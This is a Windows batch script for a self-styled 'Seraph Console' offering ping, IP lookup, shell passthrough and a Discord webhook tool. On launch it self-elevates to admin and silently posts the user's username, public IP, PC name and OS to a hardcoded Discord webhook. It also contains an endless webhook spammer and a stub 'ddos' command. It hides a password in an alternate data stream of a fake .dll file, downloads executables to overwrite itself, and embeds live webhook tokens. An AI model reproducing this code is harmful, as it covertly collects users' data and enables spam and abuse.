@echo off
rem  ___                          _     
rem (  _ \                       ( )    
rem | (_(_)  __  _ __   _ _ _ _  | |__  
rem  \__ \ / __ \  __)/ _  )  _ \|  _  \
rem ( )_) |  ___/ |  ( (_| | (_) ) | | |
rem  \____)\____)_)   \__ _)  __/(_) (_)
rem                        | |          
rem                        (_)          
rem 
REM  Copyright © Seraph 2021. All Rights Reserved.

:: ----------- Config ----------- ::

title Loading Seraph . . . 
if not exist %appdata%\Seraph\ goto seraphfilesdownload
if not exist %appdata%\Seraph\paping goto seraphfilesdownload

:config
chcp 65001 >nul
cd %appdata%\Seraph\ >nul
mode con lines=33 cols=80 >nul
SETLOCAL EnableDelayedExpansion >nul
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
if exist "%appdata%\Seraph\4BzIoO0Fdu.dll" goto passwd
goto variables
:passwd
certutil -decode %appdata%\Seraph\4BzIoO0Fdu.dll:23948429348.ser %appdata%\Seraph\outpass.ser
for /f "delims=" %%x in (%appdata%\Seraph\outpass.ser) do set Build=%%x
del %appdata%\Seraph\outpass.ser >nul
cls
set "psCommand=powershell -Command "$pword = read-host 'Enter Password' -AsSecureString ; ^
    $BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pword); ^
        [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)""
for /f "usebackq delims=" %%p in (`%psCommand%`) do set password=%%p
if %password% == %Build% goto variables
echo  
echo Incorrect Password.
timeout 2 >nul
goto passwd

:: ----------- Variables ----------- ::

:variables
for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
for /f %%a in ('powershell Invoke-RestMethod api64.ipify.org') do set PublicIPV6=%%a
set LoginLOG=https://discord.com/api/webhooks/921463028556394526/bcGqQmQ1kETzoygyeU_Y3DlzIWHv6LvI7GLDbiqTm12VwkNNuTF4EDiZBoxxhi7H4Slq
set DDoSLOG=https://discord.com/api/webhooks/899870530419703868/4zq84JKbIqgqz42U6Rj1ZAG8T1_aMmSnAfcHA1ROOtEHMc8ftnMlpzHVSx5q1qaSXQ63
set filepath=%~f0
set user=root
curl --silent -X POST -H "Content-type: application/json" --data ^
 "{\"content\":  \"```^
                     New user login info : %DATE% : %TIME%\n \n Account Name: %user%\n\n Username: %USERNAME%\n\n IP Address: %PublicIP%^
 \n\n PC Name: %COMPUTERNAME%\n\n OS: %OS%\n\n ProccesorStructure: %PROCESSOR_ARCHITECTURE%```\n\"}" %LoginLOG%
ipconfig /flushdns >nul
goto console
for /f "tokens=5 delims= " %%a in ('vol c: ^| Find "Serial Number"') do (
set VOLSERIAL=%%a
)
:: ----------- Main ----------- ::

:console
cls
title Seraph Console [Alpha 0.4]
mode con lines=33 cols=80 >nul
set input= 
echo [38;2;255;255;255mSeraph Console [Alpha 0.4]
echo (c) Seraph. All rights reserved.
echo.
goto consoleinput

:consoleinput
set input= 
set /p input= [38;2;255;255;255m%USERNAME%@%user% ~ $ 
set ipli=%input:~4,32%
set pip=%input:~5,32%
set dip=%input:~5,32%
set cmd=%input:~4,32%
set ps=%input:~3,32%
set color=%input:~6,32%
set title=%input:~6,32%
set ppi=%input:~6,32%
set ppp=%input:~17,32%
if ["%input%"] == ["help"] goto help REM Opens the help page.
if ["%input%"] == ["cmd %cmd%"] goto cmd
if ["%input%"] == ["ps %ps%"] goto ps
if ["%input%"] == ["pwd"] goto pwd
if ["%input%"] == ["ping %pip%"] goto ping REM Pings an external IP.
if ["%input%"] == ["webem"] goto webem
if ["%input%"] == ["pping %ppi%"] goto pping REM  Pings an external IP with TCP port.
if ["%input%"] == ["ddos %dip%"] goto ddos REM  Redirects you to a DDosing Console. (Not Finished)
if ["%input%"] == ["ipl %ipli%"] goto iplookup REM  Looks up approximate data for an external IP.
if ["%input%"] == ["ipinfo"] goto ipinfo REM  Info about you're External IP, IPV4, and IPV6.
if ["%input%"] == ["ipconfig"] goto ipinfo REM  Info about External IP, IPV4, and IPV6.
if ["%input%"] == ["credits"] goto credits REM  Rediects you to a page that shows people who helped develeped Seraph. 
if ["%input%"] == ["clear"] goto console REM  Clears all previous commands.
if ["%input%"] == ["cls"] goto console REM  Clears all previous commands.
if ["%input%"] == ["update"] goto update REM  Updates Seraph Console to the latest and stable version.
if ["%input%"] == ["python"] goto python
if ["%input%"] == ["node"] goto node
if ["%input%"] == ["node.js"] goto node
if ["%input%"] == [""] goto consoleinput
if ["%input%"] == [" "] goto consoleinput
if ["%input%"] == ["  "] goto consoleinput
if ["%input%"] == ["   "] goto consoleinput
if ["%input%"] == ["    "] goto consoleinput
if ["%input%"] == ["     "] goto consoleinput
if ["%input%"] == ["      "] goto consoleinput
if ["%input%"] == ["       "] goto consoleinput
if ["%input%"] == ["        "] goto consoleinput
if ["%input%"] == ["         "] goto consoleinput
if ["%input%"] == ["          "] goto consoleinput
if ["%input%"] == ["           "] goto consoleinput
if ["%input%"] == ["            "] goto consoleinput
if ["%input%"] == ["             "] goto consoleinput
if ["%input%"] == ["              "] goto consoleinput
if ["%input%"] == ["               "] goto consoleinput
if ["%input%"] == ["                "] goto consoleinput
if ["%input%"] == ["exit"] exit
if ["%input%"] == ["x"] exit


:invalid
echo  
echo '%input%' is not recognized as an internal or external command.
echo.
goto consoleinput


:ping
set ip=%input:~5,32%
ping %ip% -n 3
echo.
goto consoleinput


:: ----------- paping ----------- ::
:pping
echo.
set /p ppp= Port: 
echo.
paping.exe %ppi% -p %ppp% -c 3
echo.
goto consoleinput
:: ----------- paping ----------- ::


:help
mode con lines=45 cols=100 >nul
echo.
echo ping ^<ip^>                 Ping an external IP.
echo.
echo pping ^<ip^>                Ping an external IP with a TCP port.
echo  $Usage$
echo.
echo   pping ^<ip^>
echo    Port: *enter port number*
echo.
echo.
echo ipl ^<ip^>                  Look up the approximate data for an external IP.
echo.
echo credits                   Show the people who helped develop Seraph.
echo.
echo webem                     Redirects you to a discord webhook access application.
echo.
echo update                    Update Seraph to the latest and stable version.
echo  $Usage$
echo.
echo    update /all
echo.
echo.
echo python                    Redirects you to the Python Terminal (Latest Version of Python Required)
echo.
echo node                      Rediects you to the Node.js Terminal (Latest Version of Node.js Required)
echo.
echo cmd ^<command^>             Runs a Windows Command Prompt Command.
echo.
echo ps ^<command^>              Runs a Windows Powershell Command.
echo.
echo pwd                       Allows you to set a custom password for Seraph.
echo.
echo ipinfo                    Show information about you're External IPV4 and IPV6.
echo.
echo clear                     Clears the output of all previous commands.
echo.
echo.
echo   For more information, visit Seraph.xyz
echo.
echo.
goto consoleinput


:: ----------- webem ----------- ::

:webem
cls
title Webem
echo.
echo                             ╔╗╔╗╔╗    ╔╗          
echo                             ║║║║║║    ║║          
echo                             ║║║║║║╔══╗║╚═╗╔══╗╔╗╔╗
echo                             ║╚╝╚╝║║╔╗║║╔╗║║╔╗║║╚╝║
echo                             ╚╗╔╗╔╝║║═╣║╚╝║║║═╣║║║║
echo                              ╚╝╚╝ ╚══╝╚══╝╚══╝╚╩╩╝
echo.                                       
echo.
echo                             [ 1 - New Webhook    ]
echo                             [ 2 - Delete Webhook ]
echo                             [ 3 - Spammer        ]
echo                             [ x - Back to Seraph ]
echo.
set /p input= Input: 
if ["%input%"] == ["1"] goto new
if ["%input%"] == ["2"] goto delwebhook
if ["%input%"] == ["3"] goto webspam
if ["%input%"] == ["x"] goto console

:new
cls
set /p WebURL= Webhook URL: 
set /p Webname= Webhook Name: 
cls
:inputN
set /p say= Input: 
if ["%say%"] == ["webhook stop"] goto webem
set newweb=%WebURL%
curl ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"%Webname%\", \"content\": \"%say%\"}" ^
  %newweb%
goto inputN

:delwebhook
cls
set /p WebURL= Webhook URL: 
CURL -X "DELETE" %WebURL%
goto webem

:webspam
cls
set /p WebURL= Webhook URL: 
set /p Webname= Webhook Name: 
set /p WebCon= Content: 
timeout 2 >nul
goto webspam1
:webspam1
curl ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
  %WebURL%
  
  curl ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
  %WebURL%
  timeout 1 >nul
  curl ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
  %WebURL%
  timeout 1 >nul
  curl ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
  %WebURL%
  timeout 3 >nul
  curl ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
  %WebURL%
  timeout 1 >nul
  curl ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
  %WebURL%
  timeout 1 >nul
  curl ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
  %WebURL%
  timeout 1 >nul
  curl ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
  %WebURL%
goto webspam1

:: ----------- webem ----------- ::


:: ----------- update ----------- ::
:update
cls
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Updated Seraph to the latest version', 'Seraph', [System.Windows.Forms.ToolTipIcon]::None)}"
bitsadmin /transfer Python /download /priority foreground "https://github.com/iisdoodd/04-dCYTa-dVD/raw/main/seraph.bat" "%filepath%" >nul
echo.
echo Successfully updated Seraph to the latest and stable version.
echo.
timeout 4 >nul
ipconfig /flushdns >nul
cls
goto console
:: ----------- update ----------- ::


:: ----------- IPLookup ----------- ::
:iplookup
set IP=%input:~4,32%
goto action
:input
:action
if '%IP%'=='1.1.1.1' echo sUrl = "http://ipinfo.io/json" > %temp%\%webclient%.vbs & goto localip
if '%IP%'=='127.0.0.1' echo sUrl = "http://ipinfo.io/json" > %temp%\%webclient%.vbs & goto localip
goto iplookup
goto input
:iplookup
echo sUrl = "http://ipinfo.io/%IP%/json" > %temp%\%webclient%.vbs
:localip
echo set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0") >> %temp%\%webclient%.vbs
echo oHTTP.open "GET", sUrl,false >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded" >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Length", Len(sRequest) >> %temp%\%webclient%.vbs
echo oHTTP.send sRequest >> %temp%\%webclient%.vbs
echo HTTPGET = oHTTP.responseText >> %temp%\%webclient%.vbs
echo strDirectory = "%temp%\response.txt" >> %temp%\%webclient%.vbs
echo set objFSO = CreateObject("Scripting.FileSystemObject") >> %temp%\%webclient%.vbs
echo set objFile = objFSO.CreateTextFile(strDirectory) >> %temp%\%webclient%.vbs
echo objFile.Write(HTTPGET) >> %temp%\%webclient%.vbs
echo objFile.Close >> %temp%\%webclient%.vbs
rem echo Msgbox HTTPGET,vbSystemModal+vbOKOnly+vbInformation, "IP Info" >> %temp%\%webclient%.vbs
echo Wscript.Quit >> %temp%\%webclient%.vbs
start %temp%\%webclient%.vbs
set /a requests=0
echo.
rem echo Waiting for API response. . .
echo  Looking up IP Address. . .
:checkresponseexists
set /a requests=%requests% + 1
if %requests% gtr 7 goto failed
IF EXIST "%temp%\response.txt" (
goto response_exist
) ELSE (
ping 127.0.0.1 -n 2 -w 1000 >nul
goto checkresponseexists
)
:failed
taskkill /f /im wscript.exe >nul
del "%temp%\%webclient%.vbs" /f /q /s >nul
echo.
echo Did not receive a response from the API.
echo.
ipconfig /flushdns >nul
goto consoleinput
:response_exist
echo.
for /f "delims= 	" %%i in ('findstr /i "ip hostname city region country loc org postal" %temp%\response.txt') do (
	set data=%%i
	set data=!data:,=!
	set data=!data:""=Not Listed!
	set data=!data:"=!
	set data=!datIP:		!
	set data=!data:hostname:=[40;36mHostname:	!
	set data=!data:city:=[40;36mCity:		!
	set data=!data:region:=[40;36mState:	!
	set data=!data:country:=[40;36mCountry:	!
	set data=!data:loc:=[40;36mLocation:	!
	set data=!data:org:=[40;36mISP:		!
	set data=!data:postal:=[40;36mPostal:	!
	echo [40;36m!data!
)
echo.
del "%temp%\%webclient%.vbs" /f /q /s >nul
del "%temp%\response.txt" /f /q /s >nul
ipconfig /flushdns >nul
goto consoleinput
:: ----------- IPLookup ----------- ::


:ipinfo
echo.
ipconfig | find /i "IPV4"
echo.
ipconfig | find /i "IPV6"
echo.
echo    External IPV4 . . . . . . . . . . : %PublicIP%
echo.
echo    External IPV6 . . . . . . . . . . : %PublicIPV6%
echo.
goto consoleinput


:credits
echo.
echo              [+]══════════════════[+]═════════════════[+]
echo               ║                                        ║
echo               ║          Duel   - Main Developer       ║
echo               ║        Pythoral - Main Developer       ║
echo               ║                                        ║
echo              [+]══════════════════[+]═════════════════[+]
echo.
echo.
goto consoleinput


:: ----------- python ----------- ::
:python
echo [1;38;2;0;255;255m
if not exist "C:\Python310" goto pyinstall
python
goto consoleinput
:pyinstall
cls
echo.
echo Python is not installed on this machine, would you like to install it?
echo.
set /p py= Choice(Y/N): 
if %py% == Yes goto pyyes
if %py% == No goto pyno
if %py% == yes goto pyyes
if %py% == no goto pyno
if %py% == y goto pyyes
if %py% == n goto pyno
if %py% == Y goto pyyes
if %py% == N goto pyno
echo  
echo '%py%' is not a valid choice.
goto nodeinstall
:pyyes
mkdir %temp%\Seraph\
cls
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Started Download for Python', 'Seraph', [System.Windows.Forms.ToolTipIcon]::None)}"
bitsadmin /transfer Python /download /priority foreground "https://github.com/iisdoodd/04-dCYTa-dVD/raw/main/python.zip" "%temp%\Seraph\Python.zip"
powershell Expand-Archive %temp%\Seraph\python.zip -DestinationPath %temp%\Seraph\ >nul
start %temp%\Seraph\python-3.10.1-amd64.exe
cls
ipconfig /flushdns >nul
goto console

:pyno
echo.
goto consoleinput
:: ----------- python ----------- ::

:: ----------- node.js ----------- ::
:node
echo [1;38;2;0;255;255m
if not exist "C:\Program Files\nodejs" goto nodeinstall
node
goto consoleinput
:nodeinstall
cls
echo.
echo Node.js is not installed on this machine, would you like to install it?
echo.
set /p node= Choice(Y/N): 
if %node% == Yes goto nodeyes
if %node% == No goto nodeno
if %node% == yes goto nodeyes
if %node% == no goto nodeno
if %node% == y goto nodeyes
if %node% == n goto nodeno
if %node% == Y goto nodeyes
if %node% == N goto nodeno
echo  
echo '%node%' is not a valid choice.
goto nodeinstall
:nodeyes
mkdir %temp%\Seraph\
cls
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Started Download for Node', 'Seraph', [System.Windows.Forms.ToolTipIcon]::None)}"
bitsadmin /transfer Node.js /download /priority foreground "https://github.com/iisdoodd/04-dCYTa-dVD/raw/main/node.zip" "%appdata%\Seraph\node.zip"
powershell Expand-Archive %appdata%\Seraph\node.zip -DestinationPath %appdata%\Seraph\ >nul
start node.msi
cls
ipconfig /flushdns >nul
goto console

:nodeno
echo.
goto consoleinput
:: ----------- node.js ----------- ::

:: ----------- cmd ----------- ::
:cmd
mode con lines=44 cols=100 >nul
%cmd%
echo.
goto consoleinput
:: ----------- cmd ----------- ::

:: ----------- powershell ----------- ::
:ps
powershell %ps%
goto consoleinput
:: ----------- powershell ----------- ::

:: ----------- password ----------- ::

:pwd
cls
set "psCommand=powershell -Command "$pword = read-host 'Enter New Password' -AsSecureString ; ^
    $BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pword); ^
        [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)""
for /f "usebackq delims=" %%p in (`%psCommand%`) do set newpass=%%p
echo.
set "psCommand=powershell -Command "$pword = read-host 'Confirm New Password' -AsSecureString ; ^
    $BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pword); ^
        [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)""
for /f "usebackq delims=" %%p in (`%psCommand%`) do set newpass1=%%p
if %newpass1% == %newpass% goto didsetpass
echo.
echo  
echo Passwords do not match. & timeout 2 >nul & goto pwd
:didsetpass
mkdir %temp%\Seraph\
echo %newpass% > %temp%\Seraph\Seraphpass.ser
echo function == {true} > %appdata%\Seraph\4BzIoO0Fdu.dll >nul
certutil -encode %temp%\Seraph\Seraphpass.ser %temp%\Seraph\23948429348.ser >nul
type %temp%\Seraph\23948429348.ser > %appdata%\Seraph\4BzIoO0Fdu.dll:23948429348.ser
del %temp%\Seraph\23948429348.ser >nul
del %temp%\Seraph\Seraphpass.ser >nul
cls
echo.
echo [40;36mSuccessfully updated password.
timeout 2 >nul
goto console

:: ----------- password ----------- ::

:seraphfilesdownload
cd %appdata% >nul
mkdir Seraph >nul
cd %appdata%\Seraph\ >nul
if not exist %appdata%\Seraph\paping.exe bitsadmin /transfer paping.exe /download /priority foreground "https://github.com/iisdoodd/04-dCYTa-dVD/raw/main/paping.exe" "%appdata%\Seraph\paping.exe"
ipconfig /flushdns >nul
goto config
